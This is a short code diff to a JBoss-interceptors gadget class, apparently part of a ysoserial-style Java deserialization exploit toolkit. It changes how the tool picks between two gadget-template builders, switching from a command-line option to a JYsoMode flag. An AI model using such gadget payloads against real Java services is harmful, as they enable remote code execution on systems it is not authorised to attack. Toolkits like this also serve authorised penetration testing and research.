@@ -24,6 +24,7 @@ import org.jboss.interceptor.spi.model.InterceptionType;
 import java.lang.reflect.Constructor;
 import java.util.*;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 @Dependencies({"javassist:javassist:3.12.1.GA", "org.jboss.interceptor:jboss-interceptor-core:2.0.0.Final",
@@ -34,7 +35,7 @@ public class JBossInterceptors1 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object tpl;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             tpl = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             tpl = Gadgets.createTemplatesImpl(type, param);
